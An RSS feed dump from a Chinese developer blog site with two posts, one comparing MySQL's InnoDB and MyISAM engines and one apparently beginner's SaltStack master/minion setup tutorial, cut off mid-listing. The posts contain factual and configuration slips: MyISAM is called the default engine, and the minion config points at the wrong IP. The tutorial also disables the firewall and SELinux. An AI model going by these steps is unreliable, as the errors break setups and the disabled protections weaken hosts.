<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>分享知识-快乐自己：mysql数据库常见两种引擎 - GDBD</title>
<link>http://www.cnblogs.com/mlq2017/p/10290205.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mlq2017/p/10290205.html</guid>
<description>&lt;p&gt;&lt;span&gt;在MySQL数据库中，常用的引擎主要就是2个：Innodb和MyIASM。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.简单介绍这两种引擎，以及该如何去选择。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.这两种引擎所使用的数据结构是什么。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;Innodb引擎：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;1）：Innodb引擎，Innodb引擎提供了对数据库ACID事务的支持。并且还提供了行级锁和外键的约束。它的设计的目标就是处理大数据容量的数据库系统。它本身实际上是基于Mysql后台的完整的系统。Mysql运行的时候，Innodb会在内存中建立缓冲池，用于缓冲数据和索引。但是，该引擎是不支持全文搜索的。同时，启动也比较的慢，它是不会保存表的行数的。当进行Select count(*) from table指令的时候，需要进行扫描全表。所以当需要使用数据库的事务时，该引擎就是首选。由于锁的粒度小，写操作是不会锁定全表的。所以在并发度较高的场景下使用会提升效率的。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;MyIASM引擎：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;2）:MyIASM引擎，它是MySql的默认引擎，但不提供事务的支持，也不支持行级锁和外键。因此当执行Insert插入和Update更新语句时，即执行写操作的时候需要锁定这个表。所以会导致效率会降低。不过和Innodb不同的是，MyIASM引擎是保存了表的行数，于是当进行Select count(*) from table语句时，可以直接的读取已经保存的值而不需要进行扫描全表。所以，如果表的读操作远远多于写操作时，并且不需要事务的支持的。可以将MyIASM作为数据库引擎的首先。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;补充2点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3）:大容量的数据集时趋向于选择Innodb。因为它支持事务处理和故障的恢复。Innodb可以利用数据日志来进行数据的恢复。主键的查询在Innodb也是比较快的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4）:大批量的插入语句时（这里是INSERT语句）在MyIASM引擎中执行的比较的快，但是UPDATE语句在Innodb下执行的会比较的快，尤其是在并发量大的时候。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;两种引擎所使用的索引的数据结构是什么？&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;答案:都是B+树!&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;MyIASM引擎，B+树的数据结构中存储的内容实际上是实际数据的地址值。也就是说它的索引和实际数据是分开的，只不过使用索引指向了实际数据。这种索引的模式被称为非聚集索引。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Innodb引擎的索引的数据结构也是B+树，只不过数据结构中存储的都是实际的数据，这种索引有被称为聚集索引。&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 18 Jan 2019 15:37:00 +0000</pubDate>
<dc:creator>GDBD</dc:creator>
<og:description>mysql的常用引擎 在MySQL数据库中，常用的引擎主要就是2个：Innodb和MyIASM。 首先： 1.简单介绍这两种引擎，以及该如何去选择。 2.这两种引擎所使用的数据结构是什么。 Innod</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mlq2017/p/10290205.html</dc:identifier>
</item>
<item>
<title>saltstack之自动化运维 - 温而新</title>
<link>http://www.cnblogs.com/peng104/p/10290194.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/peng104/p/10290194.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;简介&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　saltstack是由thomas Hatch于2011年创建的一个开源项目，设计初衷是为了实现一个快速的远程执行系统。&lt;/p&gt;

&lt;p&gt;　　早期运维人员会根据自己的生产环境来写特定脚本完成大量重复性工作，这些脚本复杂且难以维护。系统管理员面临的问题主要是1、系统配置管理，2、远程执行命令，因此诞生了很多开源软件，系统维护方面有fabric、puppet、chef、ansible、saltstack等，这些软件擅长维护系统状态或方便的对大量主机进行批量的命令执行。&lt;/p&gt;
&lt;p&gt;　　salt灵活性强大，可以进行大规模部署，也能进行小规模的系统部署。salt的设计架构适用于任意数量的服务器，从少量本地网络系统到跨越数个数据中心，拓扑架构都是c/s模型，配置简单。&lt;/p&gt;
&lt;p&gt;　　不管是几台、几百台、几千台服务器，都可以使用salt在一个中心节点上进行管控，灵活定位任意服务器子集来运行命令。　&lt;/p&gt;
&lt;p&gt;　　Salt是python编写的，支持用户通过python自定义功能模块，也提供了大量的python API接口，用户可以根据需要进行简单快速的扩展。&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;saltstack的运维方式&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Local  本地运行，交付管理&lt;/li&gt;
&lt;li&gt;Master/Minion （常用方式 ）&lt;/li&gt;
&lt;li&gt;Salt SSH   不需要客户端&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;strong&gt;salt基本架构&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　在安装salt之前，先理解salt架构中各个角色，主要区分是salt-master和salt-minion，顾名思义master是中心控制系统，minion是被管理的客户端。&lt;/p&gt;
&lt;p&gt;　　salt架构中的一种就是master &amp;gt; minion。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1392643/201901/1392643-20190118220217714-1845095079.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;table border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;服务器环境&lt;/td&gt;
&lt;td&gt;centos7(master)&lt;/td&gt;
&lt;td&gt;centos7(master)&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
&lt;p&gt;ip地址&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;192.168.178.131&lt;/td&gt;
&lt;td&gt;192.168.178.132&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
&lt;p&gt;身份&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;master&lt;/td&gt;
&lt;td&gt;slave&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
&lt;p&gt;软件包&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;salt-master&lt;/td&gt;
&lt;td&gt;salt-minion&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2&gt;关闭服务器安全策略&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 关闭firewalld&lt;/span&gt;
&lt;span&gt;systemctl disable firewalld
systemctl stop firewalld

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 关闭iptables&lt;/span&gt;
iptables -&lt;span&gt;F

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 关闭selinux&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;安装saltstack&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;salt软件包需要epel源的支持， 如果没有安装epel源 &amp;lt;&lt;a href=&quot;https://www.cnblogs.com/peng104/p/10246886.html&quot; target=&quot;_blank&quot;&gt;点这里&lt;/a&gt;&amp;gt;有教程&lt;/p&gt;
&lt;p&gt;在 192.168.178.131 中安装salt-master&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
yum install salt-master -y
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;另一台安装salt-minion&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
yum install salt-minion -y
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;salt端口&lt;/h2&gt;
&lt;p&gt;安装好salt之后开始配置，salt-master默认监听两个端口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
4505   publish_port &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 提供远程命令发送功能&lt;/span&gt;
4506   ret_port     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 提供认证，文件服务，结果收集等功能&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 确保客户端可以通信服务器的此2个端口，保证防火墙允许端口通过。因此在测试环境直接关闭防火墙。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;配置文件&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
salt-master的配置文件是/etc/salt/master  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 主机 192.168.178.131&lt;/span&gt;
salt-minion的配置文件是/etc/salt/minion  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 主机 192.168.178.132&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 配置文件中包含了大量可调整的参数，这些参数控制master和minion各个方面&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;写入salt-master配置文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
interface: 0.0.0.0  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 绑定到本地的0.0.0.0地址&lt;/span&gt;
publish_port: 4505&lt;span&gt;
user: root
worker_threads: &lt;/span&gt;5&lt;span&gt;
ret_port: &lt;/span&gt;4506&lt;span&gt;
pidfile: &lt;/span&gt;/var/run/salt-&lt;span&gt;master.pid
log_file: &lt;/span&gt;/var/log/salt/&lt;span&gt;master

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 自动接收minion的key&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; auto_accept: False&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('b348767e-555a-46f0-8317-20f56c6b0a01')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_b348767e-555a-46f0-8317-20f56c6b0a01&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_b348767e-555a-46f0-8317-20f56c6b0a01&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('b348767e-555a-46f0-8317-20f56c6b0a01',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_b348767e-555a-46f0-8317-20f56c6b0a01&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt运行的用户，影响到salt的执行权限&lt;/span&gt;
&lt;span&gt;user: root

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;s alt的运行线程，开的线程越多一般处理的速度越快，但一般不要超过CPU的个数&lt;/span&gt;
worker_threads: 10

&lt;span&gt;#&lt;/span&gt;&lt;span&gt; master的管理端口&lt;/span&gt;
publish_port : 4505

&lt;span&gt;#&lt;/span&gt;&lt;span&gt; master跟minion的通讯端口，用于文件服务，认证，接受返回结果等&lt;/span&gt;
ret_port : 4506

&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果这个master运行的salt-syndic连接到了一个更高层级的master,那么这个参数需要配置成连接到的这个高层级master的监听端口&lt;/span&gt;
syndic_master_port : 4506

&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 指定pid文件位置&lt;/span&gt;
pidfile: /var/run/salt-master.pid
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;salt-master配置参数详解&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;写入sale-master配置文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
master: 192.168.178.132  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 填自己的端口或者域名&lt;/span&gt;
master_port: 4506&lt;span&gt;
user: root
id: slave  &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; id自定义&lt;/span&gt;
acceptance_wait_time: 10&lt;span&gt;
log_file: &lt;/span&gt;/var/log/salt/minion
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('9f5e9a38-8ad0-41f9-acb9-99baf784425d')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_9f5e9a38-8ad0-41f9-acb9-99baf784425d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_9f5e9a38-8ad0-41f9-acb9-99baf784425d&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('9f5e9a38-8ad0-41f9-acb9-99baf784425d',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_9f5e9a38-8ad0-41f9-acb9-99baf784425d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; minion的识别ID，可以是IP，域名，或是可以通过DNS解析的字符串&lt;/span&gt;
&lt;span&gt;id: slave
 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt运行的用户权限&lt;/span&gt;
&lt;span&gt;user: root
 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; master的识别ID，可以是IP，域名，或是可以通过DNS解析的字符串&lt;/span&gt;
&lt;span&gt;master : master
 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; master通信端口&lt;/span&gt;
master_port: 4506
 
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 备份模式，minion是本地备份，当进行文件管理时的文件备份模式&lt;/span&gt;
&lt;span&gt;backup_mode: minion
 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 执行salt-call时候的输出方式&lt;/span&gt;
&lt;span&gt;output: nested
 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; minion等待master接受认证的时间&lt;/span&gt;
acceptance_wait_time: 10
 
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 失败重连次数，0表示无限次，非零会不断尝试到设置值后停止尝试&lt;/span&gt;
&lt;span&gt;acceptance_wait_time_max: 0
 
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 重新认证延迟时间，可以避免因为master的key改变导致minion需要重新认证的syn风暴&lt;/span&gt;
random_reauth_delay: 60
 
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 日志文件位置&lt;/span&gt;
log_file: /var/logs/salt_minion.log
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;salt-minion配置参数详解&lt;/span&gt;&lt;/div&gt;
&lt;h2&gt;启动&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 192.168.178.131中：&lt;/span&gt;
systemctl start salt-master  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 启动master&lt;/span&gt;
systemctl status salt-master  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 检查start状态&lt;/span&gt;

====================================

&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 192.168.178.132&lt;/span&gt;
systemctl start salt-minion  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 启动minion&lt;/span&gt;
systemctl status salt-minion  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 检查状态&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;如果启动报错，查看是否有 /var/log/salt/ 这个文件&lt;/p&gt;
&lt;h2&gt;在master上接收minion密钥&lt;/h2&gt;
&lt;p&gt;在minion启动后连接master会请求master为其签发证书，等待证书签发完成后，master可以信任minion，并且minion和master之间的通信是加密的。&lt;/p&gt;
&lt;p&gt;在salt-master执行&lt;/p&gt;
&lt;p&gt;salt-key命令用于管理mionion秘钥&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@master ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt-key -L&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 输出结果：&lt;/span&gt;
&lt;span&gt;Accepted Keys:
Denied Keys:
Unaccepted Keys:
slave　　　　&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 此时已经出现slave&lt;/span&gt;
Rejected Keys:
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时slave已经出现在unaccepted keys中，说明minion已经和master联系，并且master已经获取了minion的公钥，等待下一步指令。&lt;/p&gt;
&lt;h2&gt;密钥匹配&lt;/h2&gt;
&lt;p&gt;在master上执行：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@master ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt-key -f 192.162.178.132&lt;/span&gt;
&lt;span&gt;Unaccepted Keys:
slave:  0a:b9:&lt;/span&gt;97:b5:9a:65:b8:49:a1:50:a5:6a:66:ce:33:ea
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后在minion上获取密钥：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[root@slave ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt-call --local key.finger&lt;/span&gt;
&lt;span&gt;local:
    0a:b9:&lt;/span&gt;97:b5:9a:65:b8:49:a1:50:a5:6a:66:ce:33:ea
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时可确认密钥匹配，在master上接收密钥&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@master ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt-key -a slave&lt;/span&gt;
&lt;span&gt;The following keys are going to be accepted:
Unaccepted Keys:
slave
Proceed? [n&lt;/span&gt;/&lt;span&gt;Y] y
Key &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; minion slave accepted.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;确认接收秘钥后，检验minion秘钥是否被接收&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@master ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt-key -L&lt;/span&gt;
&lt;span&gt;Accepted Keys:
slave  &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 表示接收成功&lt;/span&gt;
&lt;span&gt;Denied Keys:
Unaccepted Keys:
Rejected Keys:&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;好了，配置完成，可以执行命令了。&lt;/p&gt;

&lt;h2&gt;salt-key&lt;/h2&gt;
&lt;p&gt;只有master接收了minion key后才能进行管理。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
[root@master ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt-key -L&lt;/span&gt;
Accepted Keys：  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 已经接受的key&lt;/span&gt;
Denied Keys：    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 拒绝的key&lt;/span&gt;
Unaccepted Keys：&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 未加入的key&lt;/span&gt;
Rejected Keys：&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 吊销的key&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;常用参数&lt;/span&gt;
-L  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查看KEY状态&lt;/span&gt;
-A  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 允许所有&lt;/span&gt;
-D  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除所有&lt;/span&gt;
-a  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 认证指定的key&lt;/span&gt;
-d  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除指定的key&lt;/span&gt;
-r  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 注销掉指定key（该状态为未被认证）&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 在master端/etc/salt/master配置&lt;/span&gt;
auto_accept: True   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果对Minion信任,可以配置master自动接受请求&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;常用命令参数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('faf7bfc3-339f-464a-9bd2-6cb29bbccce9')&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_faf7bfc3-339f-464a-9bd2-6cb29bbccce9&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_faf7bfc3-339f-464a-9bd2-6cb29bbccce9&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('faf7bfc3-339f-464a-9bd2-6cb29bbccce9',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_faf7bfc3-339f-464a-9bd2-6cb29bbccce9&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
rpm -ql salt-&lt;span&gt;master

&lt;/span&gt;/etc/salt/master      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt master主配置文件&lt;/span&gt;
/usr/bin/salt           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt master 核心操作命令&lt;/span&gt;
/usr/bin/salt-cp       &lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt 文件传输命令&lt;/span&gt;
/usr/bin/salt-key    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt证书管理&lt;/span&gt;
/usr/bin/salt-master    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt master 服务命令&lt;/span&gt;
/usr/bin/salt-run          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt master runner命令&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;master端&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('aa071d14-3445-4d8e-aaf0-a37002e6e091')&quot; readability=&quot;31.5&quot;&gt;&lt;img id=&quot;code_img_closed_aa071d14-3445-4d8e-aaf0-a37002e6e091&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_aa071d14-3445-4d8e-aaf0-a37002e6e091&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('aa071d14-3445-4d8e-aaf0-a37002e6e091',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_aa071d14-3445-4d8e-aaf0-a37002e6e091&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
rpm -ql salt-&lt;span&gt;minion

&lt;/span&gt;/etc/salt/minion     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; minion配置文件&lt;/span&gt;
/usr/bin/salt-call    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 拉取命令&lt;/span&gt;
/usr/bin/salt-minion   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; minion服务命令&lt;/span&gt;
/usr/lib/systemd/system/salt-minion.service   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; minion启动脚本&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;slave端&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;salt命令：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
[root@master ~]&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt '*' test.ping  # 检测所有minion主机是否存活&lt;/span&gt;
&lt;span&gt;slave:
    True

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; salt 是一个命令 &lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; * 表示目标主机, 在这里代表所有目标主机 &lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; test.ping是salt远程执行的一个模块下面的方法。&lt;/span&gt;
&lt;span&gt;
[root@master &lt;/span&gt;~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; test.fib 50  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 生成斐波那契数列&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; sys.list_modules  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 列出所有salt的sys模块&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('db4e6038-81c3-442f-a4a8-2072035c9986')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_db4e6038-81c3-442f-a4a8-2072035c9986&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_db4e6038-81c3-442f-a4a8-2072035c9986&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('db4e6038-81c3-442f-a4a8-2072035c9986',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_db4e6038-81c3-442f-a4a8-2072035c9986&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; sys.list_functions test
slave:
    &lt;/span&gt;-&lt;span&gt; test.arg
    &lt;/span&gt;-&lt;span&gt; test.arg_repr
    &lt;/span&gt;-&lt;span&gt; test.arg_type
    &lt;/span&gt;-&lt;span&gt; test.assertion
    &lt;/span&gt;-&lt;span&gt; test.attr_call
    &lt;/span&gt;-&lt;span&gt; test.collatz
    &lt;/span&gt;-&lt;span&gt; test.conf_test
    &lt;/span&gt;-&lt;span&gt; test.cross_test
    &lt;/span&gt;-&lt;span&gt; test.echo
    &lt;/span&gt;-&lt;span&gt; test.exception
    &lt;/span&gt;-&lt;span&gt; test.fib
    &lt;/span&gt;-&lt;span&gt; test.get_opts
